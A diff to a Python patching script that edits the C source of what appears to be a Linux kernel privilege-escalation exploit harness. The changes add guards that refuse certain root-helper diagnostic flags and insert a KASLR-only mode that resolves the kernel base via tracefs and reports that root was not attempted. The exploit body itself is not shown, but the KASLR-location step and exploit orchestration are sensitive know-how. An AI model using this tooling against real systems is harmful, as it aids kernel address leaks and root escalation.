@@ -34,6 +34,51 @@ def patch_orchestrator(text: str) -> str:
         '  }\n\n'
     )
     text = once(text, guard_at, guard + guard_at, "explicit trial opt-in")
+    # Ordinary donor SLIDE_ONLY executes root helper preflight (creates
+    # files/executes a binfmt trigger), so deny it in this GZIF experiment.
+    text = once(
+        text,
+        '  if (getenv("SLIDE_ONLY")) {',
+        '  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY") || '
+        'getenv("PIPE_PREFLIGHT_ONLY")) {\n'
+        '    fprintf(stderr, "[gzif-trial] use GZIF_KASLR_ONLY for non-root '
+        'diagnostics\\n");\n'
+        '    return 1;\n'
+        '  }\n'
+        '  if (getenv("GZIF_KASLR_ONLY")) {',
+        "deny unsafe donor diagnostic flags",
+    )
+    # Next edit: that guard is inserted in app_main before shared memory and
+    # cannot intercept a direct diagnostic by itself. A dedicated early
+    # diagnostic path below bypasses all root-helper and RW preflight.
+    diagnostic_anchor = "  (void)pselect_delay_usec;\n"
+    diagnostic_code = (
+        '  if (getenv("GZIF_KASLR_ONLY")) {\n'
+        '    uint64_t base = 0;\n'
+        '    fprintf(stderr, "[gzif-diagnostic] KASLR only: no root preflight '
+        'or kernel memory mutation\\n");\n'
+        '    if (!kaslr_locate_via_tracefs(&base)) {\n'
+        '      fprintf(stderr, "[gzif-diagnostic] KASLR resolution failed\\n");\n'
+        '      return 0;\n'
+        '    }\n'
+        '    fprintf(stderr, "[gzif-diagnostic] KASLR resolved; root '
+        'not attempted\\n");\n'
+        '    return 1;\n'
+        '  }\n'
+    )
+    text = once(
+        text, diagnostic_anchor, diagnostic_anchor + diagnostic_code,
+        "KASLR-only diagnostic before any root helper preflight",
+    )
+    # Do not report an exploit/root success for a KASLR-only result.
+    text = once(
+        text,
+        '  if (success && getenv("PIPE_PREFLIGHT_ONLY")) {',
+        '  if (success && getenv("GZIF_KASLR_ONLY")) {\n'
+        '    puts("GZIF: KASLR-only diagnostic success; root not attempted");\n'
+        '  } else if (success && getenv("PIPE_PREFLIGHT_ONLY")) {',
+        "no false root success metric for KASLR-only run",
+    )
     text = once(
         text,
         'int attempts = env_int_clamped("EXPLOIT_ATTEMPTS", 8, 1, 0x40);',
